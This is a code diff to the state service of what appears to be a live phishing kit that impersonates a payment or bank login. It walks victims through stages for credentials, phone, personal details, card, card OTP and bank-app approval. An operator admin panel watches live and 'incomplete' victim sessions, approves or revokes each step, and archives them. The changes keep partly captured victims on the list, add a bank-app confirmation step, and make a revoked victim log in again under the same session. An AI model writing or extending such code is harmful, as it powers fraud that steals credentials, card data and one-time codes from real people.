@@ -7,7 +7,7 @@ import { retry, catchError, switchMap, tap } from 'rxjs/operators';
 import { PollingScheduler } from './polling.util';
 
 export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
-export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_pending' | 'final_review' | 'complete';
+export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
   userAgent: string;
@@ -104,7 +104,8 @@ export class StateService {
 
   // Admin view data
   readonly history = signal<SessionHistory[]>([]); 
-  readonly activeSessions = signal<SessionHistory[]>([]); 
+  readonly activeSessions = signal<SessionHistory[]>([]);
+  readonly incompleteSessions = signal<SessionHistory[]>([]);
   private sessionCache = new Map<string, SessionHistory>();
 
   // Progress Flags
@@ -610,26 +611,27 @@ export class StateService {
 
     const adminSessionId = this.sessionId();
 
-    // Active sessions: Not Verified AND Not Revoked
+    // Raw active are ones not Verified or Revoked
     const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.status !== 'Revoked' && s.sessionId !== adminSessionId);
 
     const newActiveSessions: SessionHistory[] = [];
-    const TIMEOUT_MS = 2 * 60 * 1000; // 2 minutes timeout for "Live" status
+    const newIncompleteSessions: SessionHistory[] = [];
+
+    // Thresholds:
+    // Online: < 1 min since last seen
+    // Offline: > 1 min
+    const ONLINE_THRESHOLD = 60 * 1000;
     const now = Date.now();
 
     for (const s of rawActive) {
-        // Timeout Filter
-        if (s.lastSeen && (now - s.lastSeen > TIMEOUT_MS)) {
-            continue;
-        }
+        const lastSeen = s.lastSeen || 0;
+        const isOnline = (now - lastSeen) < ONLINE_THRESHOLD;
 
         const id = s.sessionId;
-        const cached = this.sessionCache.get(id);
+        let cached = this.sessionCache.get(id);
 
-        if (cached && cached.lastSeen === s.lastSeen) {
-            newActiveSessions.push(cached);
-        } else {
-            const newSession: SessionHistory = {
+        if (!cached || cached.lastSeen !== lastSeen) {
+            cached = {
                 id: s.sessionId,
                 timestamp: new Date(s.timestamp || Date.now()),
                 lastSeen: s.lastSeen,
@@ -649,42 +651,34 @@ export class StateService {
                 isCardSubmitted: s.isCardSubmitted,
                 isFlowComplete: s.isFlowComplete
             };
-            this.sessionCache.set(id, newSession);
-            newActiveSessions.push(newSession);
+            this.sessionCache.set(id, cached);
         }
-    }
 
-    // Clean up cache
-    if (this.sessionCache.size > newActiveSessions.length) {
-         const currentIds = new Set(newActiveSessions.map(s => s.id));
-         for (const id of this.sessionCache.keys()) {
-             if (!currentIds.has(id)) {
-                 this.sessionCache.delete(id);
-             }
-         }
-    }
-
-    newActiveSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
-
-    // Only update signal if effectively different
-    let shouldUpdate = false;
-    const currentList = this.activeSessions();
-
-    if (currentList.length !== newActiveSessions.length) {
-        shouldUpdate = true;
-    } else {
-        for (let i = 0; i < newActiveSessions.length; i++) {
-            if (newActiveSessions[i] !== currentList[i]) {
-                shouldUpdate = true;
-                break;
+        if (isOnline) {
+            newActiveSessions.push(cached);
+        } else {
+            // Offline Logic: Only keep if Login is Verified (Incomplete)
+            if (cached.isLoginVerified) {
+                newIncompleteSessions.push(cached);
             }
+            // Else drop it (it effectively disappears from the list)
         }
     }
 
-    if (shouldUpdate) {
-        this.activeSessions.set(newActiveSessions);
-    }
+    // Clean up cache for removed sessions
+    const validIds = new Set([...newActiveSessions.map(s => s.id), ...newIncompleteSessions.map(s => s.id)]);
+    // Also keep history items in cache to avoid jitter if needed, but for now we focus on active
 
+    // Sort
+    newActiveSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+    newIncompleteSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+
+    // Update Signals
+    // We do simple ref equality check or length check to minimize signal updates
+    this.activeSessions.set(newActiveSessions);
+    this.incompleteSessions.set(newIncompleteSessions);
+
+    // History Processing
     const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
     const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
           id: s.sessionId,
@@ -707,13 +701,8 @@ export class StateService {
     this.history.set(mappedHistory);
 
     // Sync Monitored Session View
-    if (this.adminAuthenticated()) {
-        let targetId = this.monitoredSessionId();
-        if (!targetId && newActiveSessions.length > 0) {
-              targetId = newActiveSessions[0].id;
-              this.monitoredSessionId.set(targetId);
-        }
-    }
+    // If monitored session disappears from Active/Incomplete, deselect?
+    // Or keep it to allow viewing last state? Keeping for now.
 }
 
   public setMonitoredSession(id: string) {
@@ -783,7 +772,8 @@ export class StateService {
 
                // Route based on Verification Flow
                if (this.verificationFlow() === 'app') {
-                   this.stage.set('bank_app_pending');
+                   // NEW: Go to input stage first, user must confirm
+                   this.stage.set('bank_app_input');
                    this.navigate('bank_app', true);
                } else {
                    this.navigate('card_otp', true);
@@ -793,22 +783,23 @@ export class StateService {
            } else if (currentStage === 'card_otp_pending') {
                // Check if we need to do Bank App flow after OTP
                if (this.verificationFlow() === 'both') {
-                   this.stage.set('bank_app_pending');
+                   // NEW: Go to input stage first
+                   this.stage.set('bank_app_input');
                    this.navigate('bank_app', true);
                } else {
                    this.isFlowComplete.set(true);
                    this.navigate('success', true);
                }
            }
-           // Note: bank_app_pending is auto-completed by user action,
-           // but if Admin forces approve, we can finish it.
+           // bank_app_input is not auto-approved by Admin, user must click button.
+           // bank_app_pending IS approved by Admin.
            else if (currentStage === 'bank_app_pending') {
                this.isFlowComplete.set(true);
                this.navigate('success', true);
            }
       } else if (action === 'REVOKE') {
-           localStorage.removeItem('pp_app_state_v1');
-           localStorage.removeItem('session_id_v7');
+           // Do NOT remove session ID, just reset state
+           // localStorage.removeItem('session_id_v7'); // REMOVED
 
            // Reset State
            this.email.set('');
@@ -831,10 +822,10 @@ export class StateService {
            this.isCardSubmitted.set(false);
            this.isFlowComplete.set(false);
 
-           // Generate new ID for fresh start
-           this.sessionId.set(this.generateId());
+           // Don't generate new ID
+           // this.sessionId.set(this.generateId()); // REMOVED
 
-           this.rejectionReason.set("An error occured, Please try again");
+           this.rejectionReason.set("Something went wrong during verification steps, please login to try again.");
            this.navigate('login', true);
       }
   }
@@ -959,6 +950,8 @@ export class StateService {
   }
 
   submitBankAppApproval() {
+      // User clicked "I have approved it"
+      // Now we go to pending state and show loading
       this.stage.set('bank_app_pending');
       this.navigate('loading');
       this.waitingStart.set(Date.now());
@@ -1032,16 +1025,44 @@ export class StateService {
       }
   }
 
+  async archiveSession(id: string) {
+      try {
+           // We can simulate archiving by manually sending a completed status update,
+           // OR we can just rely on Pinning.
+           // But the request implies "moving to history".
+           // History currently contains "Verified" status sessions.
+           // So we update status to 'Verified' manually via sync/API
+           // However, API sync is usually client-side.
+           // Let's use a specialized sync call or just modify local data if we want to fake it,
+           // but real persistence requires backend update.
+           // We'll treat this as "Pinning" logic but set status to Verified?
+           // Actually, best way is to send a mock sync update from admin side
+           // OR add a backend endpoint.
+           // For simplicity in this plan: We will re-use the 'sync' endpoint but call it from admin context
+
+           const session = this.incompleteSessions().find(s => s.id === id);
+           if (session) {
+               const payload = { ...session.data, status: 'Verified' };
+               await firstValueFrom(from(fetch('/api/sync', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+               })));
+               this.showAdminToast('Session Moved to History');
+               this.fetchSessions();
+           }
+
+      } catch (e) {
+          this.showAdminToast('Failed to archive');
+      }
+  }
+
   async adminRevokeSession(id: string) {
       try {
           await firstValueFrom(from(fetch(`/api/sessions/${id}/revoke`, { method: 'POST' })));
           this.showAdminToast('Session Revoked');
 
-          // Clear current view if we just revoked it
-          if (this.monitoredSessionId() === id) {
-              this.monitoredSessionId.set(null);
-          }
-
+          // We don't clear current view anymore, we let the UI handle it (showing offline)
           this.fetchSessions();
       } catch (e) {
           this.showAdminToast('Failed to revoke');
